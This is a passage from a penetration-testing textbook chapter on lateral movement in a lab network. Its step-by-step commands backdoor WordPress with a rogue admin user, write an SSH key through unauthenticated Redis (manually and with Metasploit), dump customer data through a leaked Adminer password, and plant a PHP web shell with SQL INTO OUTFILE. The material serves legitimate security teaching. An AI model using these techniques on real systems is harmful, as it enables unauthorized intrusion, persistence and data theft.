<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_268" aria-label="268"/>Next, enumerate the available databases by using the <span class="SANS_TheSansMonoCd_W5Regular_11">show databases</span> command:</p>&#13;
<pre><code>$ MariaDB [(none)]&gt; <b>show databases;</b>&#13;
&#13;
+--------------------+&#13;
| Database           |&#13;
+--------------------+&#13;
| information_schema |&#13;
| mysql              |&#13;
| performance_schema |&#13;
| sys                |&#13;
|<b> wordpress</b>          |&#13;
+--------------------+&#13;
</code></pre>&#13;
<p class="TX">As you can see, we’ve found a WordPress database. Let’s connect some dots: this <i>c-db-02</i> server is probably the backend database of the WordPress instance running on <i>p-web-02</i>. Recall that this database wasn’t available to us when we performed penetration testing against the public network in earlier chapters. Let’s now try to use it for further exploitation.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h3 class="H2" id="sec10"><span id="h2-163"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Backdooring WordPress</span></h3>&#13;
<p class="TNI1">Now that we have access to a WordPress database as the <i>root</i> user, we can alter the database and introduce our own WordPress user. This will allow us to log in to the WordPress administration page and control the blog platform entirely. The administration page is located at <i>http://172.16.10.12/wp-admin</i>, as shown in <a href="chapter11.xhtml#fig11-2">Figure 11-2</a>.</p>&#13;
<figure class="IMG"><img id="fig11-2" class="img1" src="../images/pg268.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 11-2: The WordPress administrator portal</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_269" aria-label="269"/>To add a user, we need to insert three database rows into two tables—namely, <span class="SANS_TheSansMonoCd_W5Regular_11">wp_users</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">wp_usermeta</span>. From within the MariaDB console, run the following command to switch into the <span class="SANS_TheSansMonoCd_W5Regular_11">wordpress</span> database:</p>&#13;
<pre><code>MariaDB [(none)]&gt; <b>use wordpress;</b>&#13;
&#13;
<var>--snip--</var>&#13;
Database changed&#13;
</code></pre>&#13;
<p class="TX">Next, run three <span class="SANS_TheSansMonoCd_W5Regular_11">INSERT INTO</span> SQL commands to add new rows and create the user. The first command inserts a new user named <i>jane</i>, with the password <i>bash</i>, along with some metadata:</p>&#13;
<pre><code>MariaDB [(none)]&gt; <b>INSERT INTO `wordpress`.`wp_users` (</b>&#13;
<b>`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`,</b>&#13;
<b>`user_activation_key`, `user_status`, `display_name`) VALUES ('3', 'jane', MD5('bash'),</b>&#13;
<b>'Jane', 'jane@example.com', 'http://www.example.com/', '2023-01-01 00:00:00', '', '0', 'Jane');</b>&#13;
</code></pre>&#13;
<p class="TX">The second and third commands set the user’s permissions to that of an administrator:</p>&#13;
<pre><code>MariaDB [(none)]&gt; <b>INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`,</b>&#13;
<b>`meta_value`) VALUES (NULL, '3', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');</b>&#13;
&#13;
<b>MariaDB [(none)]&gt; INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`,</b>&#13;
<b>`meta_value`) VALUES (NULL, '3', 'wp_user_level', '10');</b>&#13;
</code></pre>&#13;
<p class="TX">As these commands are quite verbose, you can also copy them from <i>add _wordpress_admin.sql</i> in the <a href="chapter11.xhtml">Chapter 11</a> folder of this book’s GitHub repository.</p>&#13;
<p class="TX">After executing the three <span class="SANS_TheSansMonoCd_W5Regular_11">INSERT INTO</span> SQL commands, you should now be able to navigate to <i>http://172.16.10.12/wp-admin</i> and log in as the user <i>jane</i> with the password <i>bash</i>. You should see the WordPress administration panel, as shown in <a href="chapter11.xhtml#fig11-3">Figure 11-3</a>.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_270" aria-label="270"/>&#13;
<figure class="IMG"><img id="fig11-3" class="img1" src="../images/pg270.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 11-3: The WordPress panel after authentication</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">WordPress admin pages allow the modification of WordPress content files, such as HTML and PHP files, from within its interface. They also let you install plug-ins and themes, manage users, change settings related to the platform, and more.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<h3 class="H2" id="sec11"><span id="h2-164"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Running SQL Commands with Bash</span></h3>&#13;
<p class="TNI1">It’s worth noting that you can run SQL commands from within a bash script by using a heredoc (introduced in <span class="Xref"><a href="chapter1.xhtml">Chapter 1</a></span>). <a href="chapter11.xhtml#Lis11-8">Listing 11-8</a> provides an example.</p>&#13;
<span id="Lis11-8"/><pre><code>#!/bin/bash&#13;
DB_HOST="127.0.0.1"&#13;
DB_USER="root"&#13;
DB_NAME="wordpress"&#13;
&#13;
# SQL commands as input to the mysql command&#13;
mysql -h "${DB_HOST}" -u "${DB_USER}" -p "${DB_NAME}" &lt;&lt; "EOF"&#13;
INSERT INTO `wordpress`.`wp_users` ...&#13;
INSERT INTO `wordpress`.`wp_usermeta` ...&#13;
EOF&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-8: Running SQL commands in a bash script</span></p>&#13;
<p class="TX">We set a few variables containing database connection information such as the host, user, and name. We then use the <span class="SANS_TheSansMonoCd_W5Regular_11">mysql</span> command (which works for MariaDB servers) and pass these variables to the command. Using a heredoc (<span class="SANS_TheSansMonoCd_W5Regular_11">&lt;&lt;</span>), we define a list of SQL commands as input to the <span class="SANS_TheSansMonoCd_W5Regular_11">mysql</span> command. The two <span class="SANS_TheSansMonoCd_W5Regular_11">EOF</span> delimiter strings signal the beginning and end of the command within the heredoc. Once you enter this command, you’ll be <span role="doc-pagebreak" epub:type="pagebreak" id="pg_271" aria-label="271"/>prompted to enter the password you discovered through the brute-force attack in <span class="Xref">“Brute-Forcing with Medusa” on <a href="#pg_267">page 267</a></span>.</p>&#13;
<p class="HeadAExercise"><span id="exe-25"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 25: Executing Shell Commands via WordPress</span></p>&#13;
<p class="TNI1">In the previous section, you gained access to a WordPress admin page. Can you find a way to execute shell commands on the host that is serving the blog platform? You can achieve this in various ways. Here are some examples:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Modify the PHP file of a theme through the WordPress Editor by adding a PHP-based web shell to its source code.</li>&#13;
<li class="ListBullet">Upload a custom plug-in that will compromise the underlying system.</li>&#13;
<li class="ListBullet">Install a plug-in from the WordPress.com Marketplace that offers the execution of shell commands as a feature.</li>&#13;
</ul>&#13;
<p class="TX">Once you’re able to execute shell commands, establish a reverse shell by using one of the methods you’ve learned so far.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h2 class="H1" id="sec12"><span id="h1-96"/><span class="SANS_Futura_Std_Bold_B_11">Compromising a Redis Server</span></h2>&#13;
<p class="TNI1">Earlier in this chapter, we identified a Redis server running on the <i>c-redis-01</i> machine (10.1.0.14). Redis is a fast key-value database commonly used in software architecture for purposes such as caching. It’s often deployed without security protections such as passwords or ACLs that limit the commands clients can run on the database.</p>&#13;
<p class="TX">We already know that the Redis server we’ve discovered isn’t password protected. When protected by passwords, Redis servers won’t allow unauthenticated clients to execute commands without supplying the correct password, and the <span class="SANS_TheSansMonoCd_W5Regular_11">INFO</span> command we sent to the server for fingerprinting purposes wouldn’t have worked.</p>&#13;
<p class="TX">Some versions of Redis are vulnerable to a trick that lets you write arbitrary files to the system by abusing its <span class="SANS_TheSansMonoCd_W5Regular_11">CONFIG SET</span> command. Malware dubbed <i>Kinsing</i> has used this technique to compromise internet-facing Redis servers. The attack works as follows:</p>&#13;
<p class="NLF">  1.  Connect to an unprotected Redis server.</p>&#13;
<p class="NL">  2.  Issue the <span class="SANS_TheSansMonoCd_W5Regular_11">CONFIG SET dir</span> command to set the Redis configuration file’s directory path.</p>&#13;
<p class="NL">  3.  Issue a subsequent <span class="SANS_TheSansMonoCd_W5Regular_11">CONFIG SET dbfilename</span> command to set the name of the configuration file.</p>&#13;
<p class="NL">  4.  Write arbitrary malicious content into the file.</p>&#13;
<p class="NLL">  5.  Issue a <span class="SANS_TheSansMonoCd_W5Regular_11">SAVE</span> command to save the contents.</p>&#13;
<p class="TX">In this section, we’ll compromise Redis by using two methods: sending it raw Redis commands and using a Metasploit auxiliary module. Our goal is to add a backdoor SSH key on <i>c-redis-01</i>.</p>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h3 class="H2" id="sec13"><span id="h2-165"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_272" aria-label="272"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Raw CLI Commands</span></h3>&#13;
<p class="TNI1">As when exploiting the MariaDB database, we’ll establish a local port forward by using SSH to send traffic destined for <i>c-redis-01</i> through an intermediate host. This lets us make use of Kali’s tools. Run the following command on Kali to open port 6379 locally. We’ll tunnel the traffic via <i>p-jumpbox-01</i> (172.16.10.13) to <i>c-redis-01</i> (10.1.0.14) on port 6379:</p>&#13;
<pre><code>$ <b>ssh -v -N -L 6379:10.1.0.14:6379 backup@172.16.10.13</b></code></pre>&#13;
<p class="TX">Let’s verify that port 6379 is listening locally on Kali:</p>&#13;
<pre><code>$ <b>netstat -atunp | grep 6379</b></code></pre>&#13;
<p class="TX">Next, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">redis-cli</span> command on Kali to open a Redis console and send instructions to the Redis server:</p>&#13;
<pre><code>$ <b>redis-cli -h 127.0.0.1 -p 6379</b></code></pre>&#13;
<p class="TX">We’ll run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">CONFIG SET dir</span> Redis command to set the directory in which to write our public key on the Redis server:</p>&#13;
<pre><code>127.0.0.1:6379&gt; <b>CONFIG SET dir /root/.ssh/</b>&#13;
OK&#13;
</code></pre>&#13;
<p class="TX">We set <span class="SANS_TheSansMonoCd_W5Regular_11">dbfilename</span> to <span class="SANS_TheSansMonoCd_W5Regular_11">authorized_keys</span>. This will ensure that the final path where content will be written is <i>/root/.ssh/authorized_keys</i>:</p>&#13;
<pre><code>127.0.0.1:6379&gt; <b>CONFIG SET dbfilename authorized_keys</b>&#13;
OK&#13;
</code></pre>&#13;
<p class="TX">Now we’ll set a key (<span class="SANS_TheSansMonoCd_W5Regular_11">k1</span>) by using <span class="SANS_TheSansMonoCd_W5Regular_11">SET</span> followed by the public SSH key. Note that there are two newlines (<span class="SANS_TheSansMonoCd_W5Regular_11">\n\n</span>) at the beginning and end of the public-key string so that the <span class="SANS_TheSansMonoCd_W5Regular_11">authorized_keys</span> file format doesn’t get mangled:</p>&#13;
<pre><code>127.0.0.1:6379&gt; <b>SET k1 "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqfvIYYTDy</b>&#13;
<b>Dr98DoutM74ThhUb+72vUDdhRl6Y+CKx3BksVTQ7pIWayRdUaUz/LDH2/ijYGTRcf6juv3yZB5V82x</b>&#13;
<b>PbL/ApvKMFwaxrnipZEPOd4BI7EG32XBy5RhIxZXMoUrxtoiJ9QbeRJh6gw0o85ABJhFCbknhxQR14</b>&#13;
<b>uiKN7cGaE/XtVBpUiEONczEaUHlJMq6GB/SSIrEXY4iP2p9TUwv0HbljVdE+nOdeKTUINNcnLAbvC6</b>&#13;
<b>/dHwLJ/NAQ94Ch+eiGdQHauBBeO96JHtDlgYaz1/sq54FTYYJxci4fiDBmXGAG6xf34f9uyy7PugWd</b>&#13;
<b>sr5O0XR/xRJAcGn2/CGil/wIa09YtpcrkEryO0p+WUg7no3PAuotcC/fgDSFAIZnLFFKUtmWJlXMjX</b>&#13;
<b>wtOWn9hj61Mk5mT0VlkWopDnVsqXgKfHmWIJolZNdUBW/UHs4nAP+MUOOnNadxlZkKfKdzsaZHhVLM</b>&#13;
<b>CLoS+IXVKIvMf6tiLuS5LLut6e1Y2wiQmOM= kali@kali\n\n"</b>&#13;
OK&#13;
</code></pre>&#13;
<p class="TX">Finally, save the content by using the <span class="SANS_TheSansMonoCd_W7Bold_B_11">SAVE</span> command:</p>&#13;
<pre><code>127.0.0.1:6379&gt; <b>SAVE</b>&#13;
OK&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_273" aria-label="273"/>If you don’t currently have an SSH key pair set up in Kali, run <span class="SANS_TheSansMonoCd_W7Bold_B_11">ssh-keygen -t rsa</span> and follow the wizard to generate one. The public key will be available at <i>/home/kali/.ssh/id_rsa.pub</i>.</p>&#13;
<p class="TX">Now we’ll try to SSH into the <i>c-redis-01</i> server with the private key. We need to perform one more port forward so we can tunnel this SSH traffic via the jump host. We’ll listen locally on port 2222 and send traffic on port 22:</p>&#13;
<pre><code>$ <b>ssh -v -N -L 2222:10.1.0.14:22 backup@172.16.10.13</b></code></pre>&#13;
<p class="TX">Verify that port 2222 is listening locally on Kali:</p>&#13;
<pre><code>$ <b>netstat -atunp | grep 2222</b></code></pre>&#13;
<p class="TX">Now run an SSH client to connect to 10.1.0.14:</p>&#13;
<pre><code>$ <b>ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa</b>&#13;
&#13;
Linux c-redis-01.acme-infinity-servers.com 6.1.0-kali5-amd64 #1 SMP&#13;
&#13;
<var>--snip--</var>&#13;
root@c-redis-01:~#&#13;
</code></pre>&#13;
<p class="TX">Great! We’ve gained root SSH access to <i>c-redis-01</i> by using some Redis tricks.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h3 class="H2" id="sec14"><span id="h2-166"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Metasploit</span></h3>&#13;
<p class="TNI1">We can compromise Redis in a similar manner by using a Metasploit auxiliary module. <i>Metasploit</i> is a penetration-testing, vulnerability assessment, and exploitation platform written in the Ruby language and founded by H.D. Moore. It can perform many tasks, including deploying payloads.</p>&#13;
<p class="TX">In this section, we’ll use Metasploit to exploit the Redis vulnerability. This should give you exposure to Metasploit and show you alternative exploitation methods. On Kali, start Metasploit by running the <span class="SANS_TheSansMonoCd_W7Bold_B_11">msfconsole</span> command:</p>&#13;
<pre><code>$ <b>msfconsole</b></code></pre>&#13;
<p class="TX">Next, use the Redis <i>file_upload</i> auxiliary module by running the <span class="SANS_TheSansMonoCd_W7Bold_B_11">use</span> command followed by the path to the module:</p>&#13;
<pre><code>msf &gt; <b>use auxiliary/scanner/redis/file_upload</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_274" aria-label="274"/>The module requires a few options; run <span class="SANS_TheSansMonoCd_W7Bold_B_11">show options</span> to see them:</p>&#13;
<pre><code>msf auxiliary(scanner/redis/file_upload) &gt; <b>show options</b>&#13;
&#13;
Module options (auxiliary/scanner/redis/file_upload):&#13;
&#13;
Name                    Current Setting  Required  Description&#13;
----                    ---------------  --------  -----------&#13;
DISABLE_RDBCOMPRESSION  true             yes       Disable compression when saving if found...&#13;
FLUSHALL                false            yes       Run flushall to remove all redis data be...&#13;
<b>LocalFile                                no        Local file to be uploaded</b>&#13;
PASSWORD                foobared         no        Redis password for authentication test&#13;
<b>RHOSTS                                   yes       The target host(s), see https://docs.</b>&#13;
<b>                                                   metasploit.com/docs/using-metasploit/</b>&#13;
<b>                                                   basics/using-metasploit.html</b>&#13;
RPORT                   6379             yes       The target port (TCP)&#13;
<b>RemoteFile                               no        Remote file path</b>&#13;
THREADS                 1                yes       The number of concurrent threads&#13;
</code></pre>&#13;
<p class="TX">We’ve bolded the options you’ll need to set. The <span class="SANS_TheSansMonoCd_W5Regular_11">LocalFile</span> option should point to the filepath containing the public key; <span class="SANS_TheSansMonoCd_W5Regular_11">RHOSTS</span> should point to 127.0.0.1, where we’ve set up a local port forward; and <span class="SANS_TheSansMonoCd_W5Regular_11">RemoteFile</span> should point to the remote filepath where <span class="SANS_TheSansMonoCd_W5Regular_11">LocalFile</span> should be uploaded:</p>&#13;
<pre><code>msf auxiliary(scanner/redis/file_upload) &gt; <b>set LocalFile "/home/kali/.ssh/id_rsa.pub"</b>&#13;
LocalFile =&gt; /home/kali/.ssh/id_rsa.pub&#13;
&#13;
msf auxiliary(scanner/redis/file_upload) &gt; <b>set RemoteFile  "/root/.ssh/authorized_keys"</b>&#13;
RemoteFile =&gt; /root/.ssh/authorized_keys&#13;
&#13;
msf auxiliary(scanner/redis/file_upload) &gt; <b>set RHOSTS 127.0.0.1</b>&#13;
RHOSTS =&gt; 127.0.0.1&#13;
</code></pre>&#13;
<p class="TX">Finally, run the exploit with the <span class="SANS_TheSansMonoCd_W7Bold_B_11">run</span> command:</p>&#13;
<pre><code>msf auxiliary(scanner/redis/file_upload) &gt; <b>run</b>&#13;
&#13;
[+] 127.0.0.1:6379 - 127.0.0.1:6379  -- saved 564 bytes inside of redis DB at&#13;
/root/.ssh/authorized_keys&#13;
[*] 127.0.0.1:6379 - Scanned 1 of 1 hosts (100% complete)&#13;
[*] Auxiliary module execution completed&#13;
</code></pre>&#13;
<p class="TX">Now that the public key is in the root user’s <i>authorized_keys</i> file on <i>c-redis-01</i>, we can SSH into it through the local 2222 port, as we did earlier:</p>&#13;
<pre><code>$ <b>ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa</b></code></pre>&#13;
<p class="TX">Using key-based authentication, we now have persistent root access to the Redis machine. Having root access will allow you to freely explore this machine and everything that it contains.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
<h2 class="H1" id="sec15"><span id="h1-97"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_275" aria-label="275"/><span class="SANS_Futura_Std_Bold_B_11">Exposed Database Files</span></h2>&#13;
<p class="TNI1">Web servers such as Apache and nginx can be configured to serve web files from only specific directories or to serve only very specific file extensions, such as.<i>html</i> or.<i>php</i>. However, you may sometimes run into web applications that read from or write to files located in the same directory as the main web application. These could include configuration files (such as <i>.conf</i>, <i>.env</i>, and <i>.ini</i> files), simple database files such as SQLite, or even files containing credentials.</p>&#13;
<p class="TX">When applications are programmed in this way, they risk exposing these sensitive files to unauthorized users. Clients able to guess filenames on the web server may encounter downloadable files that could contain sensitive information about the application or the underlying server.</p>&#13;
<p class="TX">We have one more target to compromise: the <i>c-db-01</i> machine (10.1.0.15). If you scan this host, you’ll see that only port 80 (HTTP) is open, indicating that it is running a web server. Let’s start a local port forward so we can run some scanning tools from Kali. We’ll listen on port 8888 locally and use port 80 as the target:</p>&#13;
<pre><code>$ <b>ssh -v -N -L 8888:10.1.0.15:80 backup@172.16.10.13</b></code></pre>&#13;
<p class="TX">Verify that port 8888 is open by using <span class="SANS_TheSansMonoCd_W7Bold_B_11">netstat</span>:</p>&#13;
<pre><code>$ <b>netstat -atunp | grep 8888</b>&#13;
&#13;
(Not all processes could be identified, non-owned process info&#13;
 will not be shown, you would have to be root to see it all.)&#13;
&#13;
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1151064/ssh&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">Next, we’ll use dirsearch to search the website for any interesting pages or files. Be sure to run it for a few minutes so it can iterate through its database of possible web paths:</p>&#13;
<pre><code>$ <b>dirsearch -u http://localhost:8888</b>&#13;
&#13;
<var>--snip--</var>&#13;
[21:30:47] 403 -  276B  - /.ht_wsr.txt&#13;
[21:30:47] 403 -  276B  - /.htaccess.sample&#13;
[21:30:47] 403 -  276B  - /.htaccess.save&#13;
[21:30:48] 403 -  276B  - /.html&#13;
[21:30:48] 403 -  276B  - /.htpasswds&#13;
[21:30:48] 403 -  276B  - /.httr-oauth&#13;
[21:30:48] 403 -  276B  - /.php&#13;
<b>[21:30:58] 200 -   4KB  - /adminer.php</b>&#13;
<b>[21:31:05] 200 -  181B  - /database.sql</b>&#13;
<b>[21:31:10] 200 -  10KB  - /index.html</b>&#13;
[21:31:22] 403 -  276B  - /server-status/&#13;
[21:31:22] 403 -  276B  - /server-status&#13;
[21:32:26] 301 -  315B  - /uploads  -&gt;  http://localhost:8888/uploads/&#13;
<b>[21:32:27] 200 -  941B  - /uploads/</b>&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_276" aria-label="276"/>As you can see, some pages returned HTTP response code 403 Forbidden, while a few returned 200 OK (namely, <i>adminer.php</i>, <i>database.sql</i>, <i>index.html</i>, and <i>uploads</i>).</p>&#13;
<p class="TX">Open your local browser in Kali and navigate to <i>http://localhost:8888/adminer.php</i> to see what comes up. You should see a page similar to <a href="chapter11.xhtml#fig11-4">Figure 11-4</a>.</p>&#13;
<figure class="IMG"><img id="fig11-4" class="img1" src="../images/pg276.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 11-4: The</span> <span class="SANS_Futura_Std_Book_11">adminer.php</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">page</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><i>Adminer</i> is a database management tool that lives in a single, self- contained PHP file. It’s a lightweight alternative to database management tools such as phpMyAdmin and allows you to query databases, export and import table data, create new databases, and more.</p>&#13;
<p class="TX">The <i>adminer.php</i> page presents a login form, and we don’t have credentials for logging in. However, the dirsearch results include a file named <i>database.sql</i> that we have yet to explore. Let’s download this file by using the <span class="SANS_TheSansMonoCd_W5Regular_11">curl -o</span> argument, which writes the response output to a file:</p>&#13;
<pre><code>$ <b>curl http://127.0.0.1:8888/database.sql -o database.sql</b></code></pre>&#13;
<p class="TX">Open this file in a text editor in Kali or simply run <span class="SANS_TheSansMonoCd_W7Bold_B_11">cat</span> on it:</p>&#13;
<pre><code>$ <b>cat database.sql</b>&#13;
CREATE DATABASE IF NOT EXISTS adminer_db; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
CREATE USER IF NOT EXISTS 'adminer_user'@'localhost' IDENTIFIED BY 'P@ssword321'; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
GRANT ALL ON *.* TO 'adminer_user'@'localhost'; <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
</code></pre>&#13;
<p class="TX">This file contains SQL commands. Let’s break down what it does. First, it creates a database named <i>adminer_db</i> if one does not already exist <span class="CodeAnnotation" aria-label="annotation1">❶</span>. It then creates a user named <i>adminer_user</i> if one does not already exist, with a password set to <i>P@ssword321</i> <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Permissions to all databases and tables are granted to the <i>adminer_user</i> user <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">This script essentially sets up a database. Is it possible that the same password included in the file might grant us access to the Adminer panel? Let’s find out. Open <i>http://localhost:8888/adminer.php</i> in Kali’s browser and enter in the username and password fields <b>adminer_user</b> and <b>P@ssword321</b>.</p>&#13;
<p class="TX">Success! We’ve logged in to Adminer. You should see various databases, such as <i>adminer_db</i>, <i>customers</i>, <i>sys</i>, and <i>mysql</i>. In the next sections, we’ll use Adminer to dump database table data.</p>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h3 class="H2" id="sec16"><span id="h2-167"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_277" aria-label="277"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Dumping Sensitive Information</span></h3>&#13;
<p class="TNI1">We’ll use Adminer’s SQL interface to send SQL commands and export information from the tables in the <i>customers</i> database. Explore the tables that exist in the database by selecting <b>Customers</b> from the list (<a href="chapter11.xhtml#fig11-5">Figure 11-5</a>).</p>&#13;
<figure class="IMG"><img id="fig11-5" class="img1" src="../images/pg277.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 11-5: Tables in the</span> <span class="SANS_Futura_Std_Book_11">customers</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">database</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">The database has two tables: <i>acme_hyper_branding</i> and <i>acme_impact _alliance</i>. Let’s run a few commands by using the SQL Command page in Adminer, found in the top-left menu:</p>&#13;
<pre><code>SELECT * FROM acme_hyper_branding;&#13;
SELECT * FROM acme_impact_alliance;&#13;
</code></pre>&#13;
<p class="TX">When you run these commands, two tables should appear that contain PII for two companies, including first names, last names, designations, emails, and cleartext credentials. Save this information to CSV or SQL by clicking <b>Export</b>, then choose a file format and click <b>Export</b> again. <a href="chapter11.xhtml#Lis11-9">Listing 11-9</a> shows what a CSV export of the <i>acme_hyper_branding</i> table looks like.</p>&#13;
<span id="Lis11-9"/><pre><code>id,first_name,last_name,designation,email,password&#13;
1,Jacob,Taylor,Founder,jtaylor@acme-hyper-branding.com,carmen&#13;
2,Sarah,Lewish,Executive Assistant,slewis@acme-hyper-branding.com,cachepot&#13;
<var>--snip--</var>&#13;
6,Melissa,Rogers,Software Engineer,mrogers@acme-hyper-branding.com,melissa2go&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-9: Table data containing sensitive information</span></p>&#13;
<p class="TX">While we’ve accessed customer information, we haven’t yet completely compromised the database server.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h3 class="H2" id="sec17"><span id="h2-168"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_278" aria-label="278"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Uploading a Web Shell with SQL</span></h3>&#13;
<p class="TNI1">Can we upload a web shell by using SQL commands? MySQL has an <span class="SANS_TheSansMonoCd_W5Regular_11">INTO OUTFILE</span> statement that writes results to an output file. Using a <span class="SANS_TheSansMonoCd_W5Regular_11">SELECT</span> statement with <span class="SANS_TheSansMonoCd_W5Regular_11">INTO OUTFILE</span>, we could try to write arbitrary contents to the database server’s filesystem.</p>&#13;
<p class="TX">To be able to upload a web shell or write a file to the system, we first need to know whether the destination path we’re trying to write to exists on the system in the first place. The user account running the application must also have permission to write to the path.</p>&#13;
<p class="TX">Let’s run a few test commands in the <b>SQL Command</b> section in Adminer to see if we can write to the system. The following SQL command attempts to add content to a file named <i>file_write.txt</i>:</p>&#13;
<pre><code><b>SELECT "test_write1" into OUTFILE "file_write1.txt"</b></code></pre>&#13;
<p class="TX">The execution succeeds, as indicated by the <span class="SANS_TheSansMonoCd_W5Regular_11">Query executed OK, 1 row affected</span> response message, but we don’t know where this file exists on the filesystem. If we try browsing to <i>http://localhost:8888/file_write1.txt</i>, we get a 404 Not Found error. This means the file wasn’t saved in the web root directory, but somewhere else that we can’t browse to.</p>&#13;
<p class="TX">Can we identify the filesystem path from which the site is served? Common web root paths include directories such as <i>/var/www</i>or <i>/var/www/html</i>. Run the following command to write the file into the <i>/var/www/html</i> directory:</p>&#13;
<pre><code><b>SELECT "test_write2" into OUTFILE "/var/www/html/file_write2.txt"</b></code></pre>&#13;
<p class="TX">This time, we get a permission-denied error, as indicated by the message <span class="SANS_TheSansMonoCd_W5Regular_11">Error in query (1): can't create/write to file</span>, which means that the path exists but that the user executing the command on our behalf doesn’t have write access to it.</p>&#13;
<p class="TX">Our dirsearch scan detected an <i>uploads</i> directory. Perhaps we can write to it? Let’s find out:</p>&#13;
<pre><code><b>SELECT "test_write3" into OUTFILE "/var/www/html/uploads/file_write3.txt"</b></code></pre>&#13;
<p class="TX">Browse to <i>http://localhost:8888/uploads/file_write3.txt</i>; you should see the <i>test_write3</i> text, which indicates that we were able to write a file to the <i>uploads</i> directory.</p>&#13;
<p class="TX">Now we need to write something that gives us the ability to execute commands. We can use a PHP web shell for this. Run the following commands to write a PHP web shell into the <i>uploads</i> directory:</p>&#13;
<pre><code><b>SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into OUTFILE "/var/www/html/uploads/s.php"</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_279" aria-label="279"/>Finally, run <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to check whether we can execute commands by using the web shell:</p>&#13;
<pre><code>$ <b>curl http://localhost:8888/uploads/s.php?cmd=id</b>&#13;
&#13;
uid=33(www-data) gid=33(www-data) groups=33(www-data)&#13;
</code></pre>&#13;
<p class="TX">Success! We’re able to run system commands in the context of the <i>www-data</i> user. Before moving on, try establishing a reverse shell by using what you’ve learned so far in the book.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
<h2 class="H1" id="sec18"><span id="h1-98"/><span class="SANS_Futura_Std_Bold_B_11">Summary</span></h2>&#13;
<p class="TNI1">In this chapter, we improved our port scanning by using a frequency-enriched database of ports and identified possible access paths to additional assets on the corporate network. While moving laterally, we exploited scripts hosted on shared drives, breached unprotected databases, backdoored a WordPress instance, accessed a database administration panel through a leaked SQL file, performed Redis configuration tweaks, and uploaded a web shell by using SQL commands.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>